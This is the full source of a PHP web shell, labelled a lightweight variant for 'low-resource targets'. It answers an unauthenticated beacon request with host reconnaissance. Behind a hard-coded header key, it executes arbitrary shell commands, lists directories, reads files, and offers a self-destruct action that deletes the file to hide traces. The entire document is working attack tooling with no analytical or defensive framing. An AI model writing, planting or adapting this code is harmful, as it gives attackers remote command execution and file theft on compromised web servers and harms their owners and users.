<?php
/**
 * Lightweight variant for low-resource targets
 * Smaller footprint, fewer features
 */
define('AUTH_KEY', @$_SERVER['HTTP_X_AUTH'] ?: 'sentinelx_2024');

header('Content-Type: application/json');
$action = $_POST['action'] ?? 'beacon';

if ($action === 'beacon') {
    $disabled = ini_get('disable_functions');
    echo json_encode(['status' => 'ok', 'data' => [
        'hostname' => gethostname(),
        'os' => php_uname('s') . ' ' . php_uname('r'),
        'php' => phpversion(),
        'user' => function_exists('get_current_user') ? get_current_user() : '?',
        'cwd' => getcwd(),
        'exec' => function_exists('exec') || function_exists('shell_exec') || function_exists('system'),
    ]]);
    exit;
}

if (!isset($_SERVER['HTTP_X_AUTH']) || $_SERVER['HTTP_X_AUTH'] !== AUTH_KEY) {
    echo json_encode(['status' => 'error', 'message' => 'auth']);
    exit;
}

switch ($action) {
    case 'exec':
        $cmd = $_POST['cmd'] ?? '';
        $output = '';
        if (function_exists('exec')) { exec($cmd, $l); $output = implode("\n", $l); }
        elseif (function_exists('shell_exec')) $output = shell_exec($cmd) ?? '';
        echo json_encode(['status' => 'ok', 'output' => $output, 'cwd' => getcwd()]);
        break;

    case 'file':
        $p = $_POST['path'] ?? getcwd();
        $f = $_POST['faction'] ?? 'list';
        if ($f === 'list') {
            $items = array_diff(scandir($p), ['.','..']);
            $list = [];
            foreach ($items as $e) {
                $fp = "$p/$e";
                $list[] = ['name' => $e, 'type' => is_dir($fp) ? 'dir' : 'file', 'size' => is_file($fp) ? filesize($fp) : 0];
            }
            echo json_encode(['status' => 'ok', 'items' => $list, 'path' => realpath($p)]);
        } elseif ($f === 'read') {
            echo json_encode(['status' => 'ok', 'content' => is_file($p) ? file_get_contents($p) : '']);
        }
        break;

    case 'self_destruct':
        @unlink(__FILE__);
        echo json_encode(['status' => 'ok']);
        break;

    default:
        echo json_encode(['status' => 'error', 'message' => 'unknown']);
}
